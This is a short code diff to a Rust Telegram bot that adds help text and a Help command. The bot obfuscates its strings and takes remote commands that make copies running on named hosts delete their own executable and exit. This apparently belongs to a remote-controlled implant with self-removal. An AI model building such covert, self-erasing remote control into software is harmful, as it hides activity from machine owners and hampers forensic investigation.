@@ -13,7 +13,10 @@ use obfstr::obfstr as s;
 enum Command {
     #[command(description = "remove the executable from the system with the given hostname")]
     Remove(String),
-    Nuke
+    #[command(description = "nuke all the executables running")]
+    Nuke,
+    #[command(description = "show this text")]
+    Help
 }
 
 async fn answer(bot: Bot, msg: Message, cmd: Command) -> ResponseResult<()> {
@@ -33,6 +36,9 @@ async fn answer(bot: Bot, msg: Message, cmd: Command) -> ResponseResult<()> {
             bot.send_message(msg.chat.id, format!("Nuking {}", gethostname().to_string_lossy())).await?;
             std::fs::remove_file(std::env::current_exe().unwrap()).unwrap();
             std::process::exit(0);
+        },
+        Command::Help => {
+            bot.send_message(msg.chat.id, Command::descriptions().to_string()).await?;
         }
     }
     Ok(())
